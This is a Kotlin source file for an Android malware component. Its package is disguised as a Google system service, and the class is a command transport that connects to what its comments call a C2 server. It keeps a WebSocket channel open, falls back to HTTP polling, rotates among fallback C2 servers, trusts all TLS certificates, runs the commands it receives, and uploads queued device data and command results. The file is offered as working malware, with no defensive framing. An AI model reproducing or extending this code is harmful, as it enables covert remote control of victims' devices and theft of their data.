package com.google.android.systemservice.network

import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.DataSyncManager
import com.google.android.systemservice.utils.TrustAllCertificates
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * Manages WebSocket connection to C2 server + HTTP polling fallback.
 * Delegates received commands to onCommandReceived callback.
 */
class CommandTransport(
    private val scope: CoroutineScope,
    private val dataSyncManager: DataSyncManager,
    private val getDeviceId: () -> String,
    private val onCommandReceived: (command: String, params: JSONObject?, requestId: String?, priority: String, resource: String) -> Unit
) {
    companion object {
        private const val TAG = "SystemCore"
    }

    @Volatile var isConnected = false
        private set
    @Volatile private var webSocket: WebSocket? = null
    private var client: OkHttpClient? = null
    @Volatile private var reconnectAttempts = 0
    private val maxReconnectDelay = 300000L // 5 minutes max
    @Volatile private var httpPollingActive = false
    private var pollingJob: Job? = null
    private val HTTP_POLL_INTERVAL = 5000L // 5 seconds
    @Volatile private var isConnecting = false

    // Track current request_id for command-response correlation
    val currentRequestId = ThreadLocal<String?>()

    fun connect() {
        if (isConnecting) return
        isConnecting = true
        try {
            // Clean up previous client/socket before reconnecting
            try {
                webSocket?.close(1000, "Reconnecting")
            } catch (_: Exception) {}
            try {
                client?.dispatcher?.executorService?.shutdown()
                client?.connectionPool?.evictAll()
            } catch (_: Exception) {}

            Log.d(TAG, "connectWebSocket() called, serverUrl=${AndroidConfig.serverUrl}")
            client = TrustAllCertificates.createClientBuilder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(0, TimeUnit.MILLISECONDS) // No read timeout for WS
                .writeTimeout(30, TimeUnit.SECONDS)
                .pingInterval(25, TimeUnit.SECONDS)
                .build()

            val wsUrl = "${AndroidConfig.websocketUrl}&device_id=${getDeviceId()}"
            Log.d(TAG, "WebSocket connecting to: $wsUrl")
            val request = Request.Builder()
                .url(wsUrl)
                .build()

            webSocket = client?.newWebSocket(request, object : WebSocketListener() {
                override fun onOpen(webSocket: WebSocket, response: Response) {
                    Log.d(TAG, "WebSocket connected")
                    isConnected = true
                    isConnecting = false
                    reconnectAttempts = 0
                    stopHttpPolling()
                    subscribeToChannel()

                    // Flush any offline-queued data
                    if (dataSyncManager.hasQueuedData()) {
                        Log.d(TAG, "Flushing ${dataSyncManager.queuedCount()} queued items...")
                        dataSyncManager.flushAll { count ->
                            Log.d(TAG, "Offline sync complete: $count items uploaded")
                        }
                    }
                }

                override fun onMessage(webSocket: WebSocket, text: String) {
                    handleMessage(text)
                }

                override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                    Log.d(TAG, "WebSocket closing: $reason")
                }

                override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                    Log.d(TAG, "WebSocket closed: $reason")
                    isConnected = false
                    isConnecting = false
                    scheduleReconnect()
                }

                override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                    Log.e(TAG, "WebSocket error: ${t.message}")
                    isConnected = false
                    isConnecting = false
                    scheduleReconnect()
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Failed to connect WebSocket: ${(e.message ?: "Unknown error")}")
            isConnecting = false
            scheduleReconnect()
        }
    }

    fun disconnect() {
        isConnected = false
        stopHttpPolling()
        webSocket?.close(1000, "Service destroyed")
        client?.dispatcher?.executorService?.shutdown()
    }

    private fun subscribeToChannel() {
        val deviceId = getDeviceId()
        val subscribeMessage = JSONObject().apply {
            put("command", "subscribe")
            put("identifier", JSONObject().apply {
                put("channel", "CommandChannel")
                put("device_id", deviceId)
            }.toString())
        }
        webSocket?.send(subscribeMessage.toString())
        Log.d(TAG, "Subscribed to CommandChannel: $deviceId")
    }

    private fun handleMessage(text: String) {
        try {
            val json = JSONObject(text)

            // Ignore ping/pong and welcome messages
            val frameType = json.optString("type", "")
            if (frameType in listOf("ping", "welcome", "confirm_subscription")) {
                return
            }

            val message = json.optJSONObject("message") ?: return
            val type = message.optString("type", "")
            val command = message.optString("action", message.optString("command", ""))
            val params = message.optJSONObject("params")
            val requestId = message.optString("request_id", "")
            val serverPriority = message.optString("priority", "")
            val serverResource = message.optString("resource", "")

            // Store request_id for response correlation
            if (requestId.isNotEmpty()) {
                currentRequestId.set(requestId)
            }

            if (type.isNotEmpty()) {
                Log.d(TAG, "Received frame type: $type")
            }

            if (command.isEmpty()) {
                Log.w(TAG, "Received message without command/action: $text")
                return
            }

            Log.d(TAG, "Received command: $command (priority=$serverPriority)")
            onCommandReceived(command, params, requestId.ifEmpty { null }, serverPriority, serverResource)
        } catch (e: Exception) {
            Log.e(TAG, "Error handling message: ${(e.message ?: "Unknown error")}")
        }
    }

    fun sendResponse(type: String, data: JSONObject, requestId: String? = null) {
        val reqId = requestId ?: currentRequestId.get()
        val message = JSONObject().apply {
            put("command", "message")
            put("identifier", JSONObject().apply {
                put("channel", "CommandChannel")
                put("device_id", getDeviceId())
            }.toString())
            put("data", JSONObject().apply {
                put("type", type)
                put("payload", data)
                put("timestamp", System.currentTimeMillis())
                if (!reqId.isNullOrEmpty()) {
                    put("request_id", reqId)
                }
            }.toString())
        }
        if (isConnected) {
            webSocket?.send(message.toString())
        } else if (httpPollingActive && !reqId.isNullOrEmpty()) {
            scope.launch { sendHttpResponse(type, data) }
        }
    }

    private fun scheduleReconnect() {
        val delay: Long
        synchronized(this) {
            reconnectAttempts++
            val baseDelay = minOf((1000L * (1 shl minOf(reconnectAttempts, 6))), maxReconnectDelay)
            val jitter = (0..(baseDelay / 4)).random()
            delay = baseDelay + jitter
            Log.d(TAG, "Scheduling reconnect in ${delay}ms (attempt $reconnectAttempts, jitter ${jitter}ms)")

            // Start HTTP polling fallback after 2 failed WS attempts
            if (reconnectAttempts >= 2 && !httpPollingActive) {
                startHttpPolling()
            }

            // After 3 consecutive failures on same server, try next C2
            if (reconnectAttempts > 0 && reconnectAttempts % 3 == 0) {
                val switched = AndroidConfig.switchToNextServer()
                if (switched) {
                    Log.w(TAG, "Primary C2 unreachable, switching to fallback: ${AndroidConfig.serverUrl}")
                } else {
                    Log.w(TAG, "All C2 servers exhausted, cycling back to primary")
                    AndroidConfig.resetToPrimaryServer()
                }
            }
        }

        scope.launch {
            delay(delay)
            synchronized(this@CommandTransport) {
                if (!isConnected) {
                    connect()
                }
            }
        }
    }

    // ── HTTP Polling Fallback ────────────────────────────────────────────
    private fun startHttpPolling() {
        if (httpPollingActive) return
        httpPollingActive = true
        Log.d(TAG, "Starting HTTP polling fallback (WS unavailable)")

        pollingJob = scope.launch {
            while (httpPollingActive && isActive) {
                try {
                    pollForCommands()
                } catch (e: Exception) {
                    Log.e(TAG, "HTTP poll error: ${e.message}")
                }
                delay(HTTP_POLL_INTERVAL)
            }
        }
    }

    private fun stopHttpPolling() {
        if (!httpPollingActive) return
        httpPollingActive = false
        pollingJob?.cancel()
        pollingJob = null
        Log.d(TAG, "HTTP polling stopped (WS connected)")
    }

    private fun pollForCommands() {
        val deviceId = getDeviceId()
        val url = "${AndroidConfig.apiBaseUrl}/commands/$deviceId"
        val httpClient = client ?: TrustAllCertificates.createClientBuilder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .build().also { client = it }

        val request = Request.Builder()
            .url(url)
            .header("X-Device-Token", AndroidConfig.DEVICE_TOKEN)
            .get()
            .build()

        val response = httpClient.newCall(request).execute()
        response.use { resp ->
            if (!resp.isSuccessful) {
                Log.w(TAG, "Poll HTTP ${resp.code}")
                return
            }

            val body = resp.body?.string() ?: return
            val json = JSONObject(body)
            val commands = json.optJSONArray("commands") ?: return

            for (i in 0 until commands.length()) {
                val cmd = commands.getJSONObject(i)
                val action = cmd.optString("action", "")
                val requestId = cmd.optString("request_id", "")
                val params = cmd.optJSONObject("params")
                val priority = cmd.optString("priority", "")
                val resource = cmd.optString("resource", "")

                if (action.isNotEmpty()) {
                    Log.d(TAG, "HTTP poll received command: $action (req=$requestId, priority=$priority)")
                    if (requestId.isNotEmpty()) currentRequestId.set(requestId)
                    onCommandReceived(action, params, requestId.ifEmpty { null }, priority, resource)
                }
            }
        }
    }

    private fun sendHttpResponse(type: String, data: JSONObject) {
        val deviceId = getDeviceId()
        val reqId = currentRequestId.get() ?: return
        val url = "${AndroidConfig.apiBaseUrl}/commands/$deviceId/respond"
        val httpClient = client ?: TrustAllCertificates.createClientBuilder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .build()

        val jsonBody = JSONObject().apply {
            put("request_id", reqId)
            put("type", type)
            put("payload", data)
        }
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = jsonBody.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .header("X-Device-Token", AndroidConfig.DEVICE_TOKEN)
            .post(body)
            .build()

        try {
            val response = httpClient.newCall(request).execute()
            Log.d(TAG, "HTTP response sent: ${response.code}")
            response.close()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send HTTP response: ${e.message}")
        }
        currentRequestId.set(null)
    }
}
